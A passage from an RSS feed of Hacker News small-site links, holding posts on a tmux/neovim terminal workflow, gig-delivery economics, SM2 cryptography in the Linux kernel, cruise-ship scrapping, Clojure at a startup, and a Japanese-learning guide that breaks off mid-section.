<strong>Alacritty</strong>: <a href="https://gist.github.com/TheCedarPrince/7743091bd8743a7568b718f30bf707c2">.alacritty.yml</a>
</li>
  <li>
<strong>tmux</strong>: <a href="https://gist.github.com/TheCedarPrince/07f6f8f79b1451ec436ff8dee236ccdd">.tmux.conf</a>
</li>
  <li>
<strong>zsh</strong>: <a href="https://gist.github.com/TheCedarPrince/77afe2674803d965a0f5abd108337040">.zshrc</a>
</li>
</ul>

<p>Here is a picture of what that looks like altogether:</p>

<p><img src="http://jacobzelko.com/assets/workflow_layout.png" alt=""></p>

<h2 id="my-workflow-in-action">My Workflow in Action</h2>

<p>The following sections describe in broad strokes my workflow.
I mention some plugins that I use and are provided in my config files.
If you want to learn more about them, I encourage you to read through my config files or search for them.</p>

<h3 id="persistent-working-sessions-via-tmux">Persistent Working Sessions via tmux</h3>

<p><img src="http://jacobzelko.com/assets/tmux_restore.gif" alt=""></p>

<p>Though it is a little hard to see, I closed my terminal completely.
Oh no!
All my paneling and windows have disappeared! 
I‚Äôll have to spend valuable time getting my workflow set back up‚Ä¶ Or do I?</p>

<p>tmux can actually remember all these layouts with the plugins, <code>resurrect</code> and <code>continuum</code>. 
This is great for when your computer unexpectedly dies or crashes as everything is backed up at regular intervals you define!
Furthermore, pairing the (neo)vim plugin, <code>obsession</code>, allows tmux to also automatically recover vim layouts and sessions as well.
You will never have to worry about losing your terminal workflow again!</p>

<h3 id="vim-slime-for-rapid-evaluation">Vim-Slime for Rapid Evaluation</h3>

<p><img src="http://jacobzelko.com/assets/vim_slime.gif" alt=""></p>

<p>Here, I target my Julia REPL in a tmux panel and use the <code>vim-slime</code> plugin to send code from my Julia script opened in neovim to the Julia REPL for rapid evaluation. 
This config works for any time you want to target a window.
This also works for code chunks such as functions or loops!</p>

<h3 id="mouse-mode">Mouse Mode</h3>

<p><img src="http://jacobzelko.com/assets/mouse_mode.gif" alt=""></p>

<p>tmux and (neo)vim also support mouse mode and interactivity!
I can quickly jump all over the place with my mouse or easily resize any opened pane.</p>

<h3 id="interactive-file-finding">Interactive File Finding</h3>

<p><img src="http://jacobzelko.com/assets/vim_fzf.gif" alt=""></p>

<p>I integrated the powerful file finding tool, <code>fzf</code>, with <code>ripgrep</code> to quickly find files I am looking to use. 
Then, in my (neo)vim configuration file, I merged these two together into one function that I can easily call while editing files in (neo)vim. 
find files I search for and pandoc to enable citations in pandoc, markdown, or TeX files.</p>

<h3 id="terminal-based-file-explorer">Terminal-Based File Explorer</h3>

<p><img src="http://jacobzelko.com/assets/ranger_mode.gif" alt=""></p>

<p>Furthermore, I also use the great tool, <code>ranger</code>, which allows me to have a terminal based file explorer.
It‚Äôs nice as it pops up in its own window and does not actually directly interfere with any of the background files being edited. 
It even has image preview capabilities!</p>

<h3 id="citation-engine--live-preview">Citation Engine &amp; Live Preview</h3>

<p><img src="http://jacobzelko.com/assets/citation_mode.gif" alt=""></p>

<p>As a researcher, this part gets me immensely excited!
While I am writing, I can actively insert citation keys into whatever I am working on via <code>vim-pandoc</code>.
With my config file, you will have to specify where your own .bib file exists.
Furthermore, <code>markdown-preview</code> allows me to preview my markdown in a web browser and <code>vim-latex-live-preview</code> allows me to view my current TeX files in a pdf viewer ‚Äì works for subfiles too! 
This works for whenever I write TeX files or markdown files which makes writing a breeze!</p>

<p>If any of this section is confusing, I strongly encourage you to read my article on <a href="http://jacobzelko.com/personal-research-management/">Knowledge Management</a>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I hope you found my workflow and toolchain interesting!
My dream would be for this workflow to serve as inspiration for your own workflow.
Make it your own and all the best!</p>

<p><em>If you spot any errors or have any questions, feel free to <a href="http://jacobzelko.com/contact/">contact me</a> about them!</em></p>

<hr>

        </div></div>]]>
            </description>
            <link>http://jacobzelko.com/workflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939140</guid>
            <pubDate>Fri, 30 Oct 2020 04:22:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Every brown take-out bag]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938760">thread link</a>) | @secondbreakfast
<br/>
October 29, 2020 | https://secondbreakfast.co/inside-every-brown-take-out-bag‚Ä¶ | <a href="https://web.archive.org/web/*/https://secondbreakfast.co/inside-every-brown-take-out-bag‚Ä¶">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<blockquote>
<p><span>‚Äú</span>I wanted Uber Eats because it was raining. But didn‚Äôt end up ordering because it was raining.‚Äù - Recent text from a friend</p>
</blockquote>
<p>Paying for somebody to deliver burgers and fries usually feels fine. <em>They could decline the gig if the price isn‚Äôt fair.</em></p>
<p>But when you‚Äôre sitting on a bench across from a mid-forties man <a href="https://secondbreakfast.co/union-square">rubbing his knee and popping Advil</a>, or when a woman is standing outside the door, dripping wet, brown bag in hands, glancing at the gray Scandinavian couch and 65‚Ä≥ Sony on the wall, guilt creeps in.</p>
<p>Maybe Doordash and Instacart aren‚Äôt stealing the tips. Maybe they are. I don‚Äôt know. But I do know something feels weird about paying somebody to mask up and pluck items off the shelf while I sit on the couch. For only $8!</p>
<p>I‚Äôd order more often if I didn‚Äôt feel guilty.</p>
<p>But the gig economy is stuck in a prisoner‚Äôs dilemma. Doordash can‚Äôt raise prices to pay Dashers‚Ñ¢ more. If they did, everyone would use Postmates or Uber or Amazon instead.</p>
<p>Game theory means it‚Äôs cutthroat prices and cutthroat wages. Game theory means inside every bag of hot food left on the doorstep, there‚Äôs a little feeling of shame. <em>They could decline the gig if the price isn‚Äôt fair.</em></p>
<p>When price for delivery goes up, people order less often. Same in the other direction. But I wonder if the gig economy prisoner‚Äôs dilemma is suppressing overall demand for food and grocery delivery.</p>
<p>If seeing Palm Oil on an ingredients list didn‚Äôt make customers think about deforestation and global warming, then more products would have palm oil.</p>
<p>The same goes for delivery and labor practices.</p>
</div></div>]]>
            </description>
            <link>https://secondbreakfast.co/inside-every-brown-take-out-bag‚Ä¶</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938760</guid>
            <pubDate>Fri, 30 Oct 2020 03:14:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SM2 (Chinese) National Secret algorithm is accepted into Linux kernel]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24938686">thread link</a>) | @hyiltiz
<br/>
October 29, 2020 | https://www.codetd.com/en/article/12031985 | <a href="https://web.archive.org/web/*/https://www.codetd.com/en/article/12031985">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        
                        <p><span>
                            <a href="https://www.codetd.com/en/cat/17746/1">News</a>
                        </span>
                            <span>2020-10-27 14:44:54</span>
                            <span>views: null</span>
                        </p>

                    </div><div><div> 
  
 <p><span><span>On October 25, a developer posted that the SM2 national secret algorithm was finally accepted by the Linux kernel community. </span><span>The author stated that the SM2 patch has been updated to version v7. This version of the patch was finally accepted by the community. It has been </span></span><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/log/?qt=author&amp;q=Tianjia+Zhang"><span><span>merged into the 5.10-rc1 of the Linux mainline</span></span></a><span><span> . If nothing </span><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/log/?qt=author&amp;q=Tianjia+Zhang"><span>else</span></a><span> , it will be officially released in the 5.10 kernel version.</span></span></p> 
 <p><span><span>National Secret is the abbreviation of National Commercial Encryption. The National Encryption Administration Bureau formulates algorithm standards, and it also formulates a large number of product and interface specifications and application scenarios. </span><span>Since 2012, the State Cryptography Administration has successively published SM2/SM3/SM4 and other cryptographic algorithm standards and their application specifications in the form of the "People's Republic of China Password Industry Standards". </span><span>Among them, "SM" stands for "commercial secret", which is a cryptographic technology used for commercial use that does not involve state secrets.</span></span></p> 
 <p><span><span>According to the author, the current Linux kernel has well supported the SM3 and SM4 algorithms, thanks to the widespread use of wireless LAN standards. </span><span>However, the SM2 algorithm and the national secret certificate have not been supported for a long time, and it is impossible to establish full-stack trust and integrity verification in the kernel based on the national secret. Therefore, it has become urgent to support this system in the kernel.</span></span></p> 
 <p><span><span>It took 7 rounds for the kernel community to accept SM2. </span><span>The initial consideration was to migrate from openssl, but the openssl architecture and infrastructure code needed to be ported because of the huge workload. </span><span>After several rounds of discussion and testing, I found that the existing libgcrypt already has a complete elliptic curve basic algorithm, so I tried to implement SM2 in libgcrypt first, and finally the SM2 algorithm was accepted by the community as a sub-algorithm of ECC. </span><span>After that, SM2 was gradually accepted by the kernel community.</span></span></p> 
 <p><span><span>At present, libgcrypt has fully supported the national secret algorithm SM2/3/4, and these implementations will be officially released in the next version 1.9.0. </span><span>At the same time, as a user-mode tool for IMA integrity signatures, ima-evm-utils' support for national secrets has not fallen. </span><span>Click to view </span></span><a href="https://sourceforge.net/p/linux-ima/ima-evm-utils/ci/ceecb28d3b5267c7d32c6e9401923c94f5786cfb/log/?path="><span><span>related submissions</span></span></a><span><span> .</span></span></p> 
 <p><span><span>Finally, the author also summarizes the known issues of SM2:</span></span></p> 
 <ul> 
  <li><span><span>To support national secret certificate verification, SM2 either does not compile, or it must be built-in compilation, and does not support compilation into modules. </span><span>Of course, SM2, as an asymmetric algorithm, only signs a hash or IMA verification based on national secrets, and there is no such limitation.</span></span></li> 
  <li><span><span>The IMA signature tool ima-evm-utils and the national secret algorithm used by the kernel to calculate the SM3 hash of the file do not add Za. This is a little difference from the specification.</span></span></li> 
 </ul> 
 <p><a href="https://linux.cn/article-12751-1.html"><span><span>Reference reading</span></span></a></p> 
</div></div></div>]]>
            </description>
            <link>https://www.codetd.com/en/article/12031985</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938686</guid>
            <pubDate>Fri, 30 Oct 2020 03:01:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Messy, Booming Business of Recycling Cruise Ships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938508">thread link</a>) | @finphil
<br/>
October 29, 2020 | https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>(Bloomberg) -- Carnival Fantasy was a ship famous for its outlandish d√É¬©cor, all-night revelry and its size√¢‚Ç¨‚Äùback when 2,000 was an incredible number of passengers. The √¢‚Ç¨≈ìFun Ship√¢‚Ç¨ÔøΩ vibe it introduced in 1990 came with such whimsical spaces as an Egyptian-themed piano bar, decorated with a fake sarcophagus, and a glitzy glass-topped atrium that was the hub of the social scene.</p><p>Today the Fantasy is attracting a whole different breed of booty-seeker. In July, the 30-year-old ship sailed to the Aegean Sea, wrapping its final voyage√Ç&nbsp;in the shipbreaking capital of Aliaga, Turkey.</p><p>Its resting place there is√Ç&nbsp;a√Ç&nbsp;demolition yard where old cargo ships, tankers, research vessels√¢‚Ç¨‚Äùand now cruise ships retired during the Covid-19 pandemic√¢‚Ç¨‚Äùget torn apart and broken into pieces. In this case, they√¢‚Ç¨‚Ñ¢re not being broken in half to  get upgraded and stitched back together. Instead,√Ç&nbsp;circling the Fantasy√¢‚Ç¨‚Ñ¢s partially deconstructed innards are buyers from all sorts of industries, looking for rock bottom deals on everything from artwork and kitchenwares to electrical wires and stainless-steel sinks.</p><p>For the cruise company, it√¢‚Ç¨‚Ñ¢s an opportunity to recoup at least some value from an asset that√¢‚Ç¨‚Ñ¢s currently acting as dead weight; while ships√¢‚Ç¨‚Ñ¢ values  decline√Ç&nbsp;with age, the Fantasy was originally built for about $225 million. And for the recycling companies that buy the vessel√Ç&nbsp;for cash and take on the hazardous task of emptying all its valuables, it√¢‚Ç¨‚Ñ¢s a matter of a months-long salvage resale on steroids.</p><p>Cutting the Losses</p><p>It√¢‚Ç¨‚Ñ¢s hard to gauge how exactly much money is made off of cruise ship recycling. Companies don√¢‚Ç¨‚Ñ¢t immediately disclose the sale prices of the vessels after relinquishing ownership, and the resale value of their most sought-after commodity, scrap steel, fluctuates in each global market on a daily basis.√Ç&nbsp;</p><p>But the business is booming.</p><p>Next to Carnival Fantasy in Aliaga are two other√Ç&nbsp;Fantasy-class ships built in the late 1990s. And next to them are two former Royal Caribbean vessels (scrapped by Royal√¢‚Ç¨‚Ñ¢s Spanish partner line Pullmantur Cruceros). The ships all had big fan bases, even as they aged. Fantasy and its sister ships started 2020 full of passengers bent on fun-in-the-sun activities in the Caribbean, Bahamas, and Mexican Riviera.</p><p>The ships would have left the fleet in coming years even in a healthy industry; the pandemic sped up the process, with owners of idled vessels√Ç&nbsp;hemorrhaging cash√Ç&nbsp;and looking to cut their losses.</p><p>In its third quarter filing, Carnival Corporation said it planned to sell 18 √¢‚Ç¨≈ìless efficient√¢‚Ç¨ÔøΩ ships in 2020, resulting in a 12% reduction of its nine-brand fleet. √¢‚Ç¨≈ìThose ships were giving us a bad drain,√¢‚Ç¨ÔøΩ Carnival CEO Arnold Donald said during a recent webinar with the Society of American Travel Writers.</p><p>Going, Going, Gone</p><p>Without much of a market for second-hand tonnage, the main worth of the ships is the steel that makes up the superstructure.</p><p>If, for instance, Carnival Fantasy has 15,000 tons of steel in its superstructure, the scrap may sell for upwards of $4.7 million based on current global market prices√¢‚Ç¨‚Äùthough other factors also come into play, such as local prices and demand.</p><p>Along with the risk of these market fluctuations, the buyer also takes on the uncertainty of just how much metal can be salvaged. Pre-1990s ships tend to have more steel in their hulls and underwater plating, but those built in the √¢‚Ç¨‚Ñ¢90s and after can bear lighter and stronger alloys.</p><p>Either way, steel and metal scraps will travel to a smelter to make rebar for construction projects around the world. Steel from some other dismantled ships can find its way to Turkey√¢‚Ç¨‚Ñ¢s  large car manufacturing industry, where it might become parts for a Toyota or√Ç&nbsp;a Ford.</p><p>Aluminum, copper, and stainless steel are also salvaged and resold, along with other valuable commodities that mostly remain in Turkey. The ripped out teak decks on Fantasy may end up in local shops, restaurants, and homes. Theater scenery and lighting may find its way into show productions. Even the tackiest artwork has some value, and can end up in restaurants throughout the country.</p><p>Buyers come to the yard for everything down to the bolts and nuts. Even if a used toilet sells for a fraction of the shelf price, multiply that amount by a few thousand√¢‚Ç¨‚Äùgiven the number of cabins and public spaces on each ship√¢‚Ç¨‚Äùand it can add up to a substantial sum.</p><p>According to Orbay Simsek, vice president of the Aliaga-based Simsekler Ship Recycling Company, there are even markets for kitchenware, closets, and blankets.√Ç&nbsp;</p><p>Basically anything and everything that can be sold, sells. Everything must go. Even the sarcophagus.</p><p>Eco-friendly Shipbreaking</p><p>Taking apart ships is a controversial topic, thanks to concerns over both human and environmental risks. It√¢‚Ç¨‚Ñ¢s one of the most dangerous jobs in the world, according to Wouter Rozenveld, director of Sea2Cradle (SC2), an expert in green ship recycling who was hired by Carnival to oversee the safe dismantling of its ships. Each Carnival vessel may take up to nine months to break down, he says, and the blowtorch-based work comes with constant fire hazards.</p><p>Those hazards are amplified when the recyclable component pieces, like furniture, cabling, piping, and machinery inside each deck have to be carefully taken apart and separated says Ehud Bar-Lev, who oversees√Ç&nbsp;assessment services at maritime specialist Lloyd√¢‚Ç¨‚Ñ¢s Register.</p><p>The extra steps in disassembly also increase potential for hazardous waste spills, containing everything from oily residues to sludge, asbestos, and coolants in fridges.</p><p>To prevent those incidents, the Turkish shipbreaking yard undertakes its work in a concrete holding area that catches debris; in similar facilities throughout India and Bangladesh, the process may happen on the beach. Rather than√Ç&nbsp;letting toxic chemicals spew into the water, the Turkish yard collects the materials, has them cataloged by Sea2Cradle, and then hands them over to√Ç&nbsp;the government-run√Ç&nbsp;Ship Recycling Association of Turkey for proper disposal.</p><p>Carnival Corporation saw these precautions as a marketing√Ç&nbsp;opportunity, making a√Ç&nbsp;highly unusual move to publicize its efforts as √¢‚Ç¨≈ìresponsible recycling.√¢‚Ç¨ÔøΩ But it was the shipbreaking yard, not Carnival, that saw the biggest windfall as a result:√Ç&nbsp;never before has√Ç&nbsp;Aliaga√Ç&nbsp;seen five mega cruise ships in its harbor.</p><p>There may be more coming in the months ahead.</p><p>√¢‚Ç¨≈ìThe longer the pandemic rages on in the world, the more cruise ships will end up in scrapyards, and my guess is at an increasingly younger age,√¢‚Ç¨ÔøΩ says ManWo Ng, a maritime management professor at Virginia√¢‚Ç¨‚Ñ¢s Old Dominion University. √¢‚Ç¨≈ìEven if a vaccine becomes available, how many of us will be comfortable jumping right back on cruise ships?√¢‚Ç¨ÔøΩ</p><p>√Ç¬©2020 Bloomberg L.P.</p></div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938508</guid>
            <pubDate>Fri, 30 Oct 2020 02:28:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Clojure?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938484">thread link</a>) | @simonpure
<br/>
October 29, 2020 | https://jeffchen.dev/posts/Why-Clojure/ | <a href="https://web.archive.org/web/*/https://jeffchen.dev/posts/Why-Clojure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One piece of unattributed wisdom that's stuck with me is "don't take more than one technology bet". At Ladder, our big bet is using <a href="https://clojure.org/" target="_blank" rel="nofollow noopener noreferrer">Clojure</a> for fullstack app development. Ladder's used Clojure since day 1 in 2015, and we wouldn't want it any different! In particular, Clojure's Lisp heritage, focus on pure functions and immutable data structures, unified client-server support, and superior developer experience have helped us write higher quality code faster.</p>
<!-- excerpt -->
<h2>Pure functions and immutability</h2>
<p>One of the challenges with ordinary, imperative programming languages like Javascript or Python is the increasing complexity of state management. As your application grows, it becomes harder and harder to isolate where in the codebase specific changes to your application state occur. This is because with typical application architectures in those languages, any function can perform <a href="https://en.wikipedia.org/wiki/Side_effect_%28computer_science%29" target="_blank" rel="nofollow noopener noreferrer">side effects</a> or modify incoming or global state. On the other hand, Clojure strongly emphasizes working with <a href="https://en.wikipedia.org/wiki/Pure_function" target="_blank" rel="nofollow noopener noreferrer">pure functions</a> (well, if you discount I/O...) and <a href="https://clojure.org/about/state" target="_blank" rel="nofollow noopener noreferrer">immutable data structures</a>. A Clojure programmer must be explicit when defining and modifying mutable state - this helps minimize its usage and makes it easier to reason about.</p>
<p>Immutable data structures and pure functions also lend themselves well to concurrent programming. We rarely find ourselves worrying about locks and shared data in a multi-threaded environment, because our functions are rarely modifying shared state. And when we do, Clojure provides <code>atom</code>, a thread-safe wrapper around ordinary data structures. Behind the scenes, setting an <code>atom</code>'s value calls <code>compare-and-set!</code>. That means no fussing around with locks or mutexes and no worrying about your data changing before you modify it. With this one simple construct, Clojure removes 99% of our concurrency headaches.</p>
<h2>Clojure is a Lisp</h2>
<p>There are probably enough Lisp arguments on the Internet already - I'll defer to <a href="https://clojure.org/about/rationale#_lisp_is_a_good_thing" target="_blank" rel="nofollow noopener noreferrer">Rich Hickey</a> (Clojure's creator) and <a href="http://www.paulgraham.com/avg.html" target="_blank" rel="nofollow noopener noreferrer">Paul Graham</a> instead of adding another rehash. That said, Clojure provides some advantages over other Lisps like Common Lisp and Scheme:</p>
<ul>
<li>CL only includes lists in its core language spec. Clojure introduces vectors, sets, and maps which makes reading and writing code so much less tedious. Of course Scheme has all of these except sets.</li>
<li>Clojure's core data structures are immutable which, as discussed above, makes reasoning about code, especially concurrent code, much easier.</li>
</ul>
<h2>Clojure runs everywhere</h2>
<p>Clojure provides first class support for sharing code between platforms with <a href="https://clojure.org/guides/reader_conditionals" target="_blank" rel="nofollow noopener noreferrer">reader conditionals</a>. Most of our namespaces at Ladder take advantage of this and are shared across our client (Clojurescript) and server (Clojure). In fact, all of our client React code (aside from browser-specific API calls like clipboard, input handlers, etc) supports being run on the JVM. This lets us run what we call "full-stack tests" entirely within a Java process. For example, we can run full user flows like "user can accept a life insurance policy" and assert against both client and server state <strong>in the same test</strong>. The closest analogue without this superpower would be running a Selenium test against a running webserver, which introduces all sorts of potential flakiness. For more on full-stack tests, check out <a href="https://www.youtube.com/watch?v=qijWBPYkRAQ&amp;t=346s" target="_blank" rel="nofollow noopener noreferrer">this talk</a> two of our engineers gave at Clojure West in 2017.</p>
<p>Clojure also provides easy <a href="https://clojure.org/guides/reader_conditionals#_host_interop" target="_blank" rel="nofollow noopener noreferrer">host interop</a> for each supported platform. This lets us leverage the full JVM (and Javascript) ecosystem. For example, we use popular Java libraries like <a href="https://www.eclipse.org/jetty/" target="_blank" rel="nofollow noopener noreferrer">Jetty</a>, <a href="https://mvnrepository.com/artifact/org.apache.kafka/kafka-clients" target="_blank" rel="nofollow noopener noreferrer">kafka-clients</a>, <a href="https://github.com/google/tink" target="_blank" rel="nofollow noopener noreferrer">Tink</a>, and more. On the frontend, we use React, and can easily include other Javascript libraries for analytics, error handling, and session replays.</p>
<h2>Developer experience</h2>
<p>When I‚Äôve worked with Typescript and Python in the past, I was constantly waiting for my development server to reload. Clojure makes updating code on your local server as simple as reloading the updated namespace in your REPL. If you want, you can even <a href="https://github.com/nrepl/nrepl" target="_blank" rel="nofollow noopener noreferrer">update remote, (hopefully) non-production webservers</a>! Being able to evaluate code in a REPL and have your running web server update in less than a second makes exploration and iteration on your actual backend so much faster. Instant feedback makes developers more playful and experimental. Ultimately, it helps them write better code faster.</p>
<p>It‚Äôs also super easy to run small chunks of code in the REPL. Ladder, like other Clojure shops, has a convention of documenting namespace usage with a <code>comment</code> block at the bottom. Developers can use the code within to learn the namespace‚Äôs API, run commonly used procedures, or test changes to the rest of the namespace - all without leaving their editor!</p>
<h2>Why not Clojure?</h2>
<p>While we're extremely satisfied with our choice of Clojure, we've had our fair share of headaches. First, Clojure processes take a long time to start up - especially as the size of the application grows. Our webserver at Ladder takes a full minute before it can accept web requests. This makes autoscaling in response to load more challenging - some of our load can spike in well under a minute, so we have to be consistently overprovisioned to handle it. Second, Clojure produces pretty big artifacts. This matters less on the backend, where our webserver JAR is over 1.5GB, but hurts us on the frontend. We still have work to do here, but our initial bundle is 7.2MB uncompressed (1.0MB gzipped)! If raw performance or bundle size is your primary concern, you might be better off choosing another language.</p>
<h2>Conclusion</h2>
<p>As a small company, we have more ideas to try than we have bandwidth to implement. Using Clojure has helped our team be more iterative and more productive, so we can ship more experiments and projects than we would otherwise be able to. I feel super lucky that Ladder introduced me to Clojure - and I'm excited to see how Clojure and our use of it continues to evolve!</p>
</div></div>]]>
            </description>
            <link>https://jeffchen.dev/posts/Why-Clojure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938484</guid>
            <pubDate>Fri, 30 Oct 2020 02:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path for Mastering Japanese]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938456">thread link</a>) | @sova
<br/>
October 29, 2020 | https://japanesecomplete.com/path/ | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/path/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">    
    <!-- Hero section -->
    <section id="hero">
      <!-- Navigation -->
      <nav id="tmNav">              
        
      </nav>
      
      <div>
        <div>
            <h2>Mastering Japanese</h2>
            <p>
              Getting to Native-Level Japanese
              <br>A Straightforward <strong>Path to Mastery</strong>

              <br>by <span>Hake Hayashi</span><br>
              <span>27 October 2020</span>
            </p>
        </div>        
      </div>

            
    </section>

    <section id="introduction">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/castle-sunset.jpg" alt="Japanese Castle at Sunset">
          </p>
          <div>
            <div>
                <h2>The Syllabaries</h2>
                <div><p>
                  The Japanese language, called Êó•Êú¨Ë™ûÔºà„Å´„Åª„Çì„ÅîÔºâ[knee-hohn-go] is composed of 2 major syllabaries, <strong>Hiragana and Katakana.</strong> Made up of <strong>Consonant-Vowel pairs</strong> [ka, ga, ta, su, mu] as opposed to single letters that can be combined in variety, Hiragana and Katakana are two versions of the same collection, Katakana being used for <strong>foreign loan words</strong> since the reorganization of public education in 1962.</p><p>
                  In addition to Hiragana (the native script) and Katakana (reserved for foreign loan-words post-62), Japan imported symbolic glyphs from mainland Asia and they are referred to as Êº¢Â≠óÔºà„Åã„Çì„ÅòÔºâ kanji ‚Äî letters of the Han Dynasty.
              </p></div>
                <p>
                  You can learn the Hiragana in the inside front cover of our <a href="https://japanesecomplete.com/guide">guide</a> that contains information on essential grammar, sentence structure, sound-effect language, and covers some of the more nuanced aspects of the language in plain English.</p>
                  
            </div>
          </div>
        </div>

        <div>
          <div>
            <h4>Hiragana „Å≤„Çâ„Åå„Å™</h4>
            <p>Warm and curvy, the „Å≤„Çâ„Åå„Å™ [hiragana] are used for native Japanese words and are the primary phonetic syllabary of Japanese.
            </p>
            <p>„ÅÇ„ÄÄ„ÅÑ„ÄÄ„ÅÜ„ÄÄ„Åà„ÄÄ„Åä</p>
            <p>„Åã„ÄÄ„Åç„ÄÄ„Åè„ÄÄ„Åë„ÄÄ„Åì</p>
            <p>„Åï„ÄÄ„Åó„ÄÄ„Åô„ÄÄ„Åõ„ÄÄ„Åù</p>
            <p>„Åü„ÄÄ„Å°„ÄÄ„Å§„ÄÄ„Å¶„ÄÄ„Å®</p>
            <p>„Åæ„ÄÄ„Åø„ÄÄ„ÇÄ„ÄÄ„ÇÅ„ÄÄ„ÇÇ</p>
            <p><a href="https://japanesecomplete.com/guide">Full Hiragana Chart in our Guide‚Ä¶</a></p>
          </div>
        
        <div>
          <h4>Katakana „Ç´„Çø„Ç´„Éä</h4>
          <p>
            The „Ç´„Çø„Ç´„Éä [katakana] are sharp and angular, and while letters to friends have been written entirely in Katakana (and Kanji), <a href="https://upload.wikimedia.org/wikipedia/commons/3/3f/Masabumi_Hosono_titanic_diary.jpg">such as this beautiful letter recovered from the Titanic,</a> since 1962 the „Ç´„Çø„Ç´„Éä [katakana] have been reserved for foreign loan-words such as "computer" „Ç≥„É≥„Éî„É•„Éº„Çø [konpyuuta] and "glass" „Ç¨„É©„Çπ [garasu].  <br>„Ç´„Çø„Ç´„Éä [katakana] have a one-to-one correlation with the „Å≤„Çâ„Åå„Å™ [hiragana] similar to how English has print and cursive.
          </p>
        </div>
        <div>
          <h4>Kanji Êº¢Â≠óÔºà„Åã„Çì„ÅòÔºâ</h4>
          <p>
           The Êº¢Â≠óÔºà„Åã„Çì„ÅòÔºâ [kanji] were imported lock, stock, and barrel from mainland Asia starting in the 5th century.  Fewer than 4% of them are pictographs, and over 90% of the kanji are "meaning and sound borrowers."  You can read more about the <a href="https://learnjapanesebest.wordpress.com/2019/12/11/the-four-types-of-kanji/">four types of kanji here.</a>
          </p>
        </div>
      </div>
    </div></section> <!--end part1-->

      <section id="part2">
      <div>
        <div>
          <div>
            <div>
                <h2>Practice Listening + Identifying</h2>
                <p>
                  „ÄåËÅû„ÅçÂèñ„Çå„Å™„ÅÑ„ÄçÔºà„Åç„Åç„Å®„Çå„Å™„ÅÑÔºâ[kiki-torenai] is the Japanese expression for "unable to get a clear ear grab" of a sound or a term when listening.  The audible morphemes of Japanese require plenty of exposure to be able to distinguish them easily, due in part to the clunkiness of the syllabaries, the „Å≤„Çâ„Åå„Å™ Hiragana and „Ç´„Çø„Ç´„Éä Katakana.  
              </p>
              <p>
                Japanese Complete provides a <a href="https://japanesecomplete.com/path/japanesecomplete.com/hiragana">„Å≤„Çâ„Åå„Å™ Hiragana listening challenge</a> for free to all; our „Ç´„Çø„Ç´„Éä Katakana listening challenge is available to <a href="https://japanesecomplete.com/purchase">premium subscribers</a>
              </p>
                <p>
                  The site <a href="https://supernative.tv/">SuperNative.tv</a> has an incredible cornucopia of film and television show clips that one can watch on replay with subtitles and fill-in-the-blank exercises to practice the ability to "ear catch" or "ear grab" the audible morphemes of Japanese.  We highly recommend this resource for new learners to get an "ear grip" of the common Japanese sounds and how they are actually pronounced.  Naturally, real-life speech and the way it is written down may not appear to match up perfectly until one has plenty of exposure.</p>
                  
            </div>
          </div>
          <p><img src="https://japanesecomplete.com/img/sakura-close.jpg" alt="Image">
          </p>
        </div>
    </div></section> <!--end part 2-->

  <section id="part3">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/shinkansen-night.jpg" alt="Image">
          </p>
          <div>
            <div>
                <h2>Grammar: Particles</h2>
                <p>
                  Rather than relying on word sequence, Japanese relies on particles to partner with words in order to indicate the role of the word in the sentence.  Think of particles as dancing partners wearing brightly colored clothing who let you know the current occupation of their partner.  A subject dances with a pink-scarf wearing dancer.  A topic dances with a blue-scarf wearing dancer.  A destination of travel dances with a green-scarf wearing dancer.  When we look at the dancers, we can see clearly who they are dancing with, letting us know what the sentence means.  
              </p>
              <p>Particles are used to explain the <strong>who, what, when, where, and how</strong> of Japanese sentences and they are in <strong>post-fix position</strong>, meaning that they follow the words to which they snap.</p>
              <p>Mastery of particles is essential to having a native-level understanding of Japanese.  In fact, by exploring a frequency dictionary or the <a href="https://pj.ninjal.ac.jp/corpus_center/bccwj/en/">Balanced Corpus of Contemporary Written Japanese,</a> one will find that <em>of the 37 most frequent words, 17 of them are particles (45%).</em></p>
                <p>
                  In Japanese Complete we teach particles using a method devised specifically for Japanese Complete and not available elsewhere: <strong>the bunsetsu jar</strong>.  Every jar (which contains a person, place, or thing) needs a lid (which contains a grammatical particle).</p>
                  
            </div>
          </div>
        </div>
    </div></section> <!--end part3-->

      <section id="part4">
      <div>
        <div>
          <div>
            <div>
                <h2>Kanji: Meanings</h2>
                <p>
